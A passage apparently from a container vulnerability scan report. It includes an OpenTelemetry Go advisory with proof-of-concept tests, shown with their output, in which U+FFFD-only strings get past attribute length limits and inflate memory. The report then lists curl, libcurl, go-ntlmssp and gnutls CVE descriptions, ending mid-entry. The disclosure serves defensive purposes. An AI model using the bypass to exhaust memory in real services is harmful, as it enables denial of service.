		sdktrace.WithSpanProcessor(sr),
		sdktrace.WithSpanLimits(limitsWithLen(limit)),
	)
	defer func() { _ = tp.Shutdown(context.Background()) }()

	tr := tp.Tracer("poc")
	_, span := tr.Start(context.Background(), "op")
	span.SetAttributes(attrs...)
	span.End()

	ended := sr.Ended()
	if len(ended) != 1 {
		t.Fatalf("expected 1 ended span, got %d", len(ended))
	}
	return ended[0].Attributes()
}

// TestOT001_FFFDOnlyStringBypassesTraceLengthLimit demonstrates that a string
// attribute composed of valid U+FFFD runes is stored completely untruncated
// although AttributeValueLengthLimit=5.
func TestOT001_FFFDOnlyStringBypassesTraceLengthLimit(t *testing.T) {
	const limit = 5
	val := strings.Repeat("\uFFFD", 1000) // 1000 chars, 3000 bytes

	got := captureOneSpan(t, limit, attribute.String("k", val))
	if len(got) != 1 {
		t.Fatalf("expected 1 attribute, got %d", len(got))
	}
	stored := got[0].Value.AsString()
	t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
		utf8.RuneCountInString(val), len(val),
		utf8.RuneCountInString(stored), len(stored), limit)
	// Per OTel spec ("counting any character in it as 1") the stored value
	// must be at most `limit` characters (<= 15 bytes for U+FFFD).
	if maxBytes := 3 * limit; len(stored) > maxBytes {
		t.Fatalf("BYPASS: AttributeValueLengthLimit=%d but %d bytes stored (expected <=%d)",
			limit, len(stored), maxBytes)
	}
}

// TestOT001_FFFDMixedStringOverRetains demonstrates that valid U+FFFD runes
// are not counted in the optimistic truncation path: every U+FFFD adds 3
// uncounted bytes to the retained value.
func TestOT001_FFFDMixedStringOverRetains(t *testing.T) {
	const limit = 5
	val := strings.Repeat("\uFFFD", 100) + strings.Repeat("A", 6) // 106 chars, 306 bytes

	got := captureOneSpan(t, limit, attribute.String("k", val))
	stored := got[0].Value.AsString()
	t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
		utf8.RuneCountInString(val), len(val),
		utf8.RuneCountInString(stored), len(stored), limit)
	if chars := utf8.RuneCountInString(stored); chars > limit {
		t.Fatalf("BYPASS: AttributeValueLengthLimit=%d but %d chars / %d bytes stored",
			limit, chars, len(stored))
	}
}

// TestOT001_ASCIIControl is the control case: plain ASCII over-limit values
// ARE truncated, proving the length limit is active in the same setup.
func TestOT001_ASCIIControl(t *testing.T) {
	const limit = 5
	val := strings.Repeat("B", 20)

	got := captureOneSpan(t, limit, attribute.String("k", val))
	stored := got[0].Value.AsString()
	t.Logf("input: %d chars / %d bytes; stored: %d chars / %d bytes; limit=%d",
		utf8.RuneCountInString(val), len(val),
		utf8.RuneCountInString(stored), len(stored), limit)
	if len(stored) != limit {
		t.Fatalf("control failed: ASCII value not truncated (stored %d bytes)", len(stored))
	}
}

// TestOT001_EventAttributesNotLengthTruncated documents that span-event
// attributes bypass AttributeValueLengthLimit entirely (no attrnorm.Truncate
// call in recordingSpan.addEvent).
func TestOT001_EventAttributesNotLengthTruncated(t *testing.T) {
	const limit = 5
	val := strings.Repeat("C", 100)

	sr := tracetest.NewSpanRecorder()
	tp := sdktrace.NewTracerProvider(
		sdktrace.WithSpanProcessor(sr),
		sdktrace.WithSpanLimits(limitsWithLen(limit)),
	)
	defer func() { _ = tp.Shutdown(context.Background()) }()
	tr := tp.Tracer("poc")
	_, span := tr.Start(context.Background(), "op")
	span.AddEvent("ev", trace.WithAttributes(attribute.String("k", val)))
	span.End()

	ended := sr.Ended()
	events := ended[0].Events()
	if len(events) != 1 {
		t.Fatalf("expected 1 event, got %d", len(events))
	}
	stored := events[0].Attributes[0].Value.AsString()
	t.Logf("event attribute input: %d bytes; stored: %d bytes; limit=%d", len(val), len(stored), limit)
	if len(stored) > limit {
		t.Logf("CONFIRMED: event attribute not length-truncated (%d bytes > limit %d)", len(stored), limit)
	}
}
```

(The `-run` pattern above selects the three truncation cases plus the control; the fourth test function is included because it is part of the exact file that produced the output below - it compiles but is not selected by the pattern, and its output does not appear.)

`otelgo_log_truncate_test.go`:

```go
package otelpoc

import (
	"context"
	"strings"
	"sync"
	"testing"
	"unicode/utf8"

	"go.opentelemetry.io/otel/attribute"
	apisdk "go.opentelemetry.io/otel/log"
	sdklog "go.opentelemetry.io/otel/sdk/log"
)

type captureProcessor struct {
	mu   sync.Mutex
	recs []*sdklog.Record
}

func (c *captureProcessor) Enabled(context.Context, sdklog.EnabledParameters) bool { return true }

func (c *captureProcessor) OnEmit(_ context.Context, r *sdklog.Record) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	clone := r.Clone()
	c.recs = append(c.recs, &clone)
	return nil
}

func (c *captureProcessor) Shutdown(context.Context) error { return nil }
func (c *captureProcessor) ForceFlush(context.Context) error {
	return nil
}

// TestOT001_FFFDOnlyStringBypassesLogLengthLimit repeats the bypass against
// the sdk/log attribute path (sdk/log/internal/attrnorm, same template).
func TestOT001_FFFDOnlyStringBypassesLogLengthLimit(t *testing.T) {
	const limit = 5
	cp := &captureProcessor{}
	lp := sdklog.NewLoggerProvider(
		sdklog.WithProcessor(cp),
		sdklog.WithAttributeValueLengthLimit(limit),
	)
	defer func() { _ = lp.Shutdown(context.Background()) }()

	logger := lp.Logger("poc")
	var r apisdk.Record
	r.SetSeverity(apisdk.SeverityInfo)
	r.AddAttributes(attribute.String("k", strings.Repeat("\uFFFD", 1000)))
	logger.Emit(context.Background(), r)

	cp.mu.Lock()
	if len(cp.recs) != 1 {
		t.Fatalf("expected 1 record, got %d", len(cp.recs))
	}
	rec := cp.recs[0]
	cp.mu.Unlock()

	stored := ""
	rec.WalkAttributes(func(kv attribute.KeyValue) bool {
		if string(kv.Key) == "k" {
			stored = kv.Value.AsString()
		}
		return true
	})
	t.Logf("sdk/log input: 1000 chars / 3000 bytes; stored: %d chars / %d bytes; limit=%d",
		utf8.RuneCountInString(stored), len(stored), limit)
	if maxBytes := 3 * limit; len(stored) > maxBytes {
		t.Fatalf("BYPASS: sdk/log WithAttributeValueLengthLimit=%d but %d bytes stored (expected <=%d)",
			limit, len(stored), maxBytes)
	}
}
```

Run:

```
go mod tidy
go test -count=1 -v -run "TestOT001_FFFDOnlyStringBypassesTraceLengthLimit|TestOT001_FFFDMixedStringOverRetains|TestOT001_ASCIIControl|TestOT001_FFFDOnlyStringBypassesLogLengthLimit" .
```

Expected output (captured against the published v1.46.0 modules; the three FAIL lines are the bypass being triggered and the PASS control proves the limit is active in the same setup; the only varying parts are the durations in parentheses and the total on the `FAIL	otelpoc` summary line):

```
=== RUN   TestOT001_FFFDOnlyStringBypassesLogLengthLimit
    otelgo_log_truncate_test.go:66: sdk/log input: 1000 chars / 3000 bytes; stored: 1000 chars / 3000 bytes; limit=5
    otelgo_log_truncate_test.go:69: BYPASS: sdk/log WithAttributeValueLengthLimit=5 but 3000 bytes stored (expected <=15)
--- FAIL: TestOT001_FFFDOnlyStringBypassesLogLengthLimit (0.00s)
=== RUN   TestOT001_FFFDOnlyStringBypassesTraceLengthLimit
    otelgo_truncate_test.go:61: input: 1000 chars / 3000 bytes; stored: 1000 chars / 3000 bytes; limit=5
    otelgo_truncate_test.go:67: BYPASS: AttributeValueLengthLimit=5 but 3000 bytes stored (expected <=15)
--- FAIL: TestOT001_FFFDOnlyStringBypassesTraceLengthLimit (0.00s)
=== RUN   TestOT001_FFFDMixedStringOverRetains
    otelgo_truncate_test.go:81: input: 106 chars / 306 bytes; stored: 105 chars / 305 bytes; limit=5
    otelgo_truncate_test.go:85: BYPASS: AttributeValueLengthLimit=5 but 105 chars / 305 bytes stored
--- FAIL: TestOT001_FFFDMixedStringOverRetains (0.00s)
=== RUN   TestOT001_ASCIIControl
    otelgo_truncate_test.go:98: input: 20 chars / 20 bytes; stored: 5 chars / 5 bytes; limit=5
--- PASS: TestOT001_ASCIIControl (0.00s)
FAIL
FAIL	otelpoc	0.059s
FAIL
```

The mixed-string case stores 105 characters for a limit of 5: the 100 U+FFFD runes (300 uncounted bytes) are all retained, plus 5 of the 6 ASCII characters.

## Impact

Applications that enable `AttributeValueLengthLimit` (or `WithAttributeValueLengthLimit` for logs) to bound attribute memory do not get that bound for values containing valid U+FFFD runes. Span and log-record attribute values are routinely derived from untrusted input (HTTP headers, request bodies, database fields), so an attacker can inflate per-span memory retention linearly, defeating the memory protection the operator explicitly enabled and accumulating increased memory usage over the span/log pipeline. Confidentiality and integrity are not affected.

## Suggested fix

In the optimistic loop, count every rune of size > 1 (including the legitimately encoded U+FFFD) and only divert size-1 invalid bytes to the slow path. Add regression cases for: pure U+FFFD strings, U+FFFD-dominated mixed strings, and a truncation point landing after a U+FFFD (the current `truncate_test.go` has no U+FFFD case).

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/azure/go-ntlmssp</strong> <code>0.0.0-20221128193559-754e69321358</code> (golang)</summary>

<small><code>pkg:golang/github.com/azure/go-ntlmssp@0.0.0-20221128193559-754e69321358</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-32952?s=github&n=go-ntlmssp&ns=github.com%2Fazure&t=golang&vr=%3C0.1.1"><img alt="medium 5.3: CVE--2026--32952" src="https://img.shields.io/badge/CVE--2026--32952-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Integer Overflow or Wraparound</i>

<table>
<tr><td>Affected range</td><td><code>&lt;0.1.1</code></td></tr>
<tr><td>Fixed version</td><td><code>0.1.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.524%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>75th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

go-ntlmssp is a Go package that provides NTLM/Negotiate authentication over HTTP. Prior to version 0.1.1, a malicious NTLM challenge message can causes an slice out of bounds panic, which can crash any Go process using `ntlmssp.Negotiator` as an HTTP transport. Version 0.1.1 patches the issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 7" src="https://img.shields.io/badge/L-7-fce1a9"/> <!-- unspecified: 0 --><strong>libcurl4t64</strong> <code>8.14.1-2+deb13u7</code> (deb)</summary>

<small><code>pkg:deb/debian/libcurl4t64@8.14.1-2%2Bdeb13u7?arch=amd64&distro=debian-13.8&upstream=curl</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-9547?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--9547" src="https://img.shields.io/badge/CVE--2026--9547-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.361%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When a libcurl-based application performs transfers via `SCP://` or `SFTP://` and utilizes the `CURLOPT_SSH_KEYFUNCTION` callback, it may silently accept an untrusted server. This vulnerability occurs when a server presents a host key type that does not match the specific key type already recorded for that host in the `known_hosts` file. Instead of rejecting the mismatch, the callback mechanism fails to properly enforce the restriction, allowing the connection to succeed without warning and risking a potential man-in-the-middle attack.

---
- curl 8.21.0~rc2-1 (unimportant)
https://curl.se/docs/CVE-2026-9547.html
Debian builds with --without-libssh --with-libssh2.
Introduced with: https://github.com/curl/curl/commit/507cf6a13db0375eadd4655b4c64710db29e9cf2 (curl-7_69_0)
Fixed by: https://github.com/curl/curl/commit/0b8dbbc63c98777e4584cb9fbd71df3464008ad1 (rc-8_21_0-1, curl-8_21_0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-87866?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--87866" src="https://img.shields.io/badge/CVE--2026--87866-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.393%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When built with wolfSSL, curl can successfully validate a pinned public key hash against a key the TLS peer does not possess. During the TLS handshake, wolfSSL validates the connection, but curl's subsequent re-parsing of the same certificate - tricked by a manipulated validity length field - extracts and matches a different embedded key, incorrectly authorizing the pinned public key.

---
- curl 8.23.0~rc1-1 (unimportant)
https://curl.se/docs/CVE-2026-87866.html
Introduced with: https://github.com/curl/curl/commit/0675abbc7572ff6d711a1f325d9b812f98bce78f (curl-7_43_0)
Fixed by: https://github.com/curl/curl/commit/ed131747c1a3dc7f816d26724c44537ac8acba44 (rc-8_23_0-1)
curl in Debian not built with wolfSSL support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-82208?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--82208" src="https://img.shields.io/badge/CVE--2026--82208-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.407%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

With the wolfSSL backend, when CA caching is enabled and an `CURLOPT_SSL_CTX_FUNCTION` callback replaces the trust store, libcurl can silently reinstall the cached store after the callback returns. A certificate trusted by the cached store but rejected by the callback-selected store is then incorrectly accepted.

---
- curl 8.22.0-1 (unimportant)
[bookworm] - curl <not-affected> (Vulnerable code introduced later)
https://curl.se/docs/CVE-2026-82208.html
Introduced with: https://github.com/curl/curl/commit/0f2876b2c33f6784a27b6f7345bd8cd95b46352a (curl-8_9_1)
Fixed by: https://github.com/curl/curl/commit/ed0338befd1d865a8ea1fbaa90013a096dedd07a (curl-8_22_0)
curl in Debian not built with wolfSSL support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15224?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--15224" src="https://img.shields.io/badge/CVE--2025--15224-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.604%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing SSH-based transfers using either SCP or SFTP, and asked to do public key authentication, curl would wrongly still ask and authenticate using a locally running SSH agent.

---
- curl 8.18.0-1 (unimportant)
https://curl.se/docs/CVE-2025-15224.html
Introduced with: https://github.com/curl/curl/commit/c92d2e14cfb0db662f958effd2ac86f995cf1b5a (curl-7_58_0)
Fixed by: https://github.com/curl/curl/commit/16d5f2a5660c61cc27bd5f1c7f512391d1c927aa (curl-8_18_0)
Debian builds with libssh2 for SSH backend

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15079?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--15079" src="https://img.shields.io/badge/CVE--2025--15079-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.550%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing SSH-based transfers using either SCP or SFTP, and setting the known_hosts file, libcurl could still mistakenly accept connecting to hosts *not present* in the specified file if they were added as recognized in the libssh *global* known_hosts file.

---
- curl 8.18.0~rc3-1 (unimportant)
https://curl.se/docs/CVE-2025-15079.html
Introduced with: https://github.com/curl/curl/commit/c92d2e14cfb0db662f958effd2ac86f995cf1b5a (curl-7_58_0)
Fixed by: https://github.com/curl/curl/commit/adca486c125d9a6d9565b9607a19dce803a8b479 (rc-8_18_0-3, curl-8_18_0)
Debian builds with libssh2 for SSH backend

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-14017?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--14017" src="https://img.shields.io/badge/CVE--2025--14017-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.114%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing multi-threaded LDAPS transfers (LDAP over TLS) with libcurl, changing TLS options in one thread would inadvertently change them globally and therefore possibly also affect other concurrently setup transfers.  Disabling certificate verification for a specific transfer could unintentionally disable the feature for other threads as well.

---
- curl 8.18.0~rc2-1 (unimportant)
https://curl.se/docs/CVE-2025-14017.html
Introduced with: https://github.com/curl/curl/commit/ccba0d10b6baf5c73cae8cf4fb3f29f0f55c5a34 (curl-7_17_0)
Fixed by: https://github.com/curl/curl/commit/39d1976b7f709a516e3243338ebc0443bdd8d56d (rc-8_18_0-1, curl-8_18_0)
Built with OpenLDAP (only affects the legacy LDAP support)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-10966?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--10966" src="https://img.shields.io/badge/CVE--2025--10966-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.551%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

curl's code for managing SSH connections when SFTP was done using the wolfSSH powered backend was flawed and missed host verification mechanisms.  This prevents curl from detecting MITM attackers and more.

---
- curl 8.17.0~rc2-1 (unimportant)
https://curl.se/docs/CVE-2025-10966.html
Introduced with: https://github.com/curl/curl/commit/6773c7ca65cf2183295e56603f9b86a5ce816a06 (curl-7_69_0)
Fixed by: https://github.com/curl/curl/commit/b011e3fcfb06d6c0278595ee2ee297036fbe9793 (rc-8_17_0-1)
wolfSSH backend not used in Debian

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 7" src="https://img.shields.io/badge/L-7-fce1a9"/> <!-- unspecified: 0 --><strong>curl</strong> <code>8.14.1-2+deb13u7</code> (deb)</summary>

<small><code>pkg:deb/debian/curl@8.14.1-2%2Bdeb13u7?arch=amd64&distro=debian-13.8</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-9547?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--9547" src="https://img.shields.io/badge/CVE--2026--9547-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.361%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When a libcurl-based application performs transfers via `SCP://` or `SFTP://` and utilizes the `CURLOPT_SSH_KEYFUNCTION` callback, it may silently accept an untrusted server. This vulnerability occurs when a server presents a host key type that does not match the specific key type already recorded for that host in the `known_hosts` file. Instead of rejecting the mismatch, the callback mechanism fails to properly enforce the restriction, allowing the connection to succeed without warning and risking a potential man-in-the-middle attack.

---
- curl 8.21.0~rc2-1 (unimportant)
https://curl.se/docs/CVE-2026-9547.html
Debian builds with --without-libssh --with-libssh2.
Introduced with: https://github.com/curl/curl/commit/507cf6a13db0375eadd4655b4c64710db29e9cf2 (curl-7_69_0)
Fixed by: https://github.com/curl/curl/commit/0b8dbbc63c98777e4584cb9fbd71df3464008ad1 (rc-8_21_0-1, curl-8_21_0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-87866?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--87866" src="https://img.shields.io/badge/CVE--2026--87866-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.393%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When built with wolfSSL, curl can successfully validate a pinned public key hash against a key the TLS peer does not possess. During the TLS handshake, wolfSSL validates the connection, but curl's subsequent re-parsing of the same certificate - tricked by a manipulated validity length field - extracts and matches a different embedded key, incorrectly authorizing the pinned public key.

---
- curl 8.23.0~rc1-1 (unimportant)
https://curl.se/docs/CVE-2026-87866.html
Introduced with: https://github.com/curl/curl/commit/0675abbc7572ff6d711a1f325d9b812f98bce78f (curl-7_43_0)
Fixed by: https://github.com/curl/curl/commit/ed131747c1a3dc7f816d26724c44537ac8acba44 (rc-8_23_0-1)
curl in Debian not built with wolfSSL support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-82208?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--82208" src="https://img.shields.io/badge/CVE--2026--82208-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.407%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

With the wolfSSL backend, when CA caching is enabled and an `CURLOPT_SSL_CTX_FUNCTION` callback replaces the trust store, libcurl can silently reinstall the cached store after the callback returns. A certificate trusted by the cached store but rejected by the callback-selected store is then incorrectly accepted.

---
- curl 8.22.0-1 (unimportant)
[bookworm] - curl <not-affected> (Vulnerable code introduced later)
https://curl.se/docs/CVE-2026-82208.html
Introduced with: https://github.com/curl/curl/commit/0f2876b2c33f6784a27b6f7345bd8cd95b46352a (curl-8_9_1)
Fixed by: https://github.com/curl/curl/commit/ed0338befd1d865a8ea1fbaa90013a096dedd07a (curl-8_22_0)
curl in Debian not built with wolfSSL support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15224?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--15224" src="https://img.shields.io/badge/CVE--2025--15224-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.604%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing SSH-based transfers using either SCP or SFTP, and asked to do public key authentication, curl would wrongly still ask and authenticate using a locally running SSH agent.

---
- curl 8.18.0-1 (unimportant)
https://curl.se/docs/CVE-2025-15224.html
Introduced with: https://github.com/curl/curl/commit/c92d2e14cfb0db662f958effd2ac86f995cf1b5a (curl-7_58_0)
Fixed by: https://github.com/curl/curl/commit/16d5f2a5660c61cc27bd5f1c7f512391d1c927aa (curl-8_18_0)
Debian builds with libssh2 for SSH backend

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15079?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--15079" src="https://img.shields.io/badge/CVE--2025--15079-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.550%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing SSH-based transfers using either SCP or SFTP, and setting the known_hosts file, libcurl could still mistakenly accept connecting to hosts *not present* in the specified file if they were added as recognized in the libssh *global* known_hosts file.

---
- curl 8.18.0~rc3-1 (unimportant)
https://curl.se/docs/CVE-2025-15079.html
Introduced with: https://github.com/curl/curl/commit/c92d2e14cfb0db662f958effd2ac86f995cf1b5a (curl-7_58_0)
Fixed by: https://github.com/curl/curl/commit/adca486c125d9a6d9565b9607a19dce803a8b479 (rc-8_18_0-3, curl-8_18_0)
Debian builds with libssh2 for SSH backend

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-14017?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--14017" src="https://img.shields.io/badge/CVE--2025--14017-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.114%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When doing multi-threaded LDAPS transfers (LDAP over TLS) with libcurl, changing TLS options in one thread would inadvertently change them globally and therefore possibly also affect other concurrently setup transfers.  Disabling certificate verification for a specific transfer could unintentionally disable the feature for other threads as well.

---
- curl 8.18.0~rc2-1 (unimportant)
https://curl.se/docs/CVE-2025-14017.html
Introduced with: https://github.com/curl/curl/commit/ccba0d10b6baf5c73cae8cf4fb3f29f0f55c5a34 (curl-7_17_0)
Fixed by: https://github.com/curl/curl/commit/39d1976b7f709a516e3243338ebc0443bdd8d56d (rc-8_18_0-1, curl-8_18_0)
Built with OpenLDAP (only affects the legacy LDAP support)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-10966?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--10966" src="https://img.shields.io/badge/CVE--2025--10966-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.551%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

curl's code for managing SSH connections when SFTP was done using the wolfSSH powered backend was flawed and missed host verification mechanisms.  This prevents curl from detecting MITM attackers and more.

---
- curl 8.17.0~rc2-1 (unimportant)
https://curl.se/docs/CVE-2025-10966.html
Introduced with: https://github.com/curl/curl/commit/6773c7ca65cf2183295e56603f9b86a5ce816a06 (curl-7_69_0)
Fixed by: https://github.com/curl/curl/commit/b011e3fcfb06d6c0278595ee2ee297036fbe9793 (rc-8_17_0-1)
wolfSSH backend not used in Debian

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 7" src="https://img.shields.io/badge/L-7-fce1a9"/> <!-- unspecified: 0 --><strong>libgnutls30t64</strong> <code>3.8.9-3+deb13u4</code> (deb)</summary>

<small><code>pkg:deb/debian/libgnutls30t64@3.8.9-3%2Bdeb13u4?arch=amd64&distro=debian-13.8&upstream=gnutls28</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-95210?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--95210" src="https://img.shields.io/badge/CVE--2026--95210-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.201%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

